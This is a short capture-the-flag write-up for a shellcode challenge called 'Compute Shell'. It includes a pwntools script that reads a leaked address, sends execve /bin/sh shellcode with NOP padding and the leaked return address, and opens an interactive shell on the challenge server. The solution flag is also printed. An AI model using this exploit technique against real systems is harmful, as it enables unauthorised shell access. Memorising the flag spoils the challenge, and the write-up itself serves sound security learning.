# Compute Shell

### Challenge Author

[b3y0nd3r](https://twitter.com/GeethnaTk)

### Challenge Description

Von Neumann Architecture - a boon to Computer Science, but its major strength hides a weakness. Junior Kathleen is working on a meek looking code but looks like this could be hiding the unknown. Gear up and turn the "alpha" in your favour!

### Short writeup

A simple shellcode challenge. 

```python
from pwn import *
#p = process("./chall")
p = remote('34.72.218.129',3333)
p.recvuntil("Memory leak detected:")
p.recvline()
leak = int(p.recvline().strip(),16)
print(hex(leak))
#gdb.attach(p)
p.recvuntil("Enter your code of action:")
exp  = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05".ljust(0x48,"\x90")
exp += p64(leak)
print(len(exp))
p.sendline(exp)
p.interactive()
``` 

### Flag

shaktictf{cracking_v0n_neUmann_up}
